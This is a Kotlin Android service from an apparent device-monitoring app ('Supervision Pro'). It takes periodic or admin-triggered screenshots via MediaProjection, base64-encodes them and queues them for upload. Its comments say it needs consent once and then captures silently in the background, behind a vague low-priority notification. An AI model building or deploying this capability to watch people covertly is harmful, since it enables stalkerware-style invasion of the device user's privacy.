package com.surveillancepro.android.services

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.surveillancepro.android.MainActivity
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Service de capture d'écran via MediaProjection.
 * Nécessite un consentement utilisateur UNE SEULE FOIS (au setup),
 * puis peut capturer silencieusement en arrière-plan.
 *
 * Mode: périodique (toutes les X minutes) ou sur commande admin.
 */
class ScreenCaptureService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private var intervalMs = DEFAULT_INTERVAL_MS
    private var isCapturing = false

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
            ?: Activity.RESULT_CANCELED
        val resultData = intent?.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)

        if (resultCode != Activity.RESULT_OK || resultData == null) {
            Log.w(TAG, "No valid projection data, stopping")
            stopSelf()
            return START_NOT_STICKY
        }

        intervalMs = intent.getLongExtra(EXTRA_INTERVAL_MS, DEFAULT_INTERVAL_MS)
        val isSingleShot = intent.getBooleanExtra(EXTRA_SINGLE_SHOT, false)

        startForeground(NOTIFICATION_ID, buildNotification())

        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)

        if (isSingleShot) {
            captureScreenshot()
            handler.postDelayed({ stopSelf() }, 3000)
        } else {
            startPeriodicCapture()
        }

        return START_STICKY
    }

    private fun startPeriodicCapture() {
        isCapturing = true
        scheduleNextCapture()
        Log.d(TAG, "Periodic capture started (interval: ${intervalMs / 60000}min)")
    }

    private fun scheduleNextCapture() {
        if (!isCapturing) return
        handler.postDelayed({
            if (isCapturing) {
                captureScreenshot()
                scheduleNextCapture()
            }
        }, intervalMs)
    }

    private fun captureScreenshot() {
        val projection = mediaProjection ?: return
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        val scaleFactor = 0.5f
        val width = (metrics.widthPixels * scaleFactor).toInt()
        val height = (metrics.heightPixels * scaleFactor).toInt()
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        virtualDisplay = projection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface,
            null, handler
        )

        imageReader!!.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride, height,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                if (croppedBitmap != bitmap) bitmap.recycle()

                val stream = ByteArrayOutputStream()
                croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 50, stream)
                croppedBitmap.recycle()

                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)

                val queue = EventQueue.getInstance(applicationContext)
                queue.enqueue("screenshot", mapOf(
                    "imageBase64" to base64,
                    "width" to width,
                    "height" to height,
                    "quality" to 50,
                    "sizeBytes" to stream.size(),
                    "timestamp" to dateFormat.format(Date()),
                ))

                Log.d(TAG, "Screenshot captured (${stream.size() / 1024} Ko)")
            } catch (e: Exception) {
                Log.w(TAG, "Screenshot processing error: ${e.message}")
            } finally {
                image.close()
                virtualDisplay?.release()
                virtualDisplay = null
                imageReader?.close()
                imageReader = null
            }
        }, handler)
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Supervision Pro")
            .setContentText("Service actif")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Supervision Pro",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Service de supervision"
            setShowBadge(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onDestroy() {
        isCapturing = false
        handler.removeCallbacksAndMessages(null)
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "ScreenCaptureService"
        private const val CHANNEL_ID = "supervision_pro_service"
        private const val NOTIFICATION_ID = 1003
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_INTERVAL_MS = "interval_ms"
        const val EXTRA_SINGLE_SHOT = "single_shot"
        private const val DEFAULT_INTERVAL_MS = 10 * 60 * 1000L // 10 minutes

        fun hasPermission(context: Context): Boolean {
            val prefs = context.getSharedPreferences("sp_screen_capture", Context.MODE_PRIVATE)
            return prefs.getBoolean("permission_granted", false)
        }
    }
}
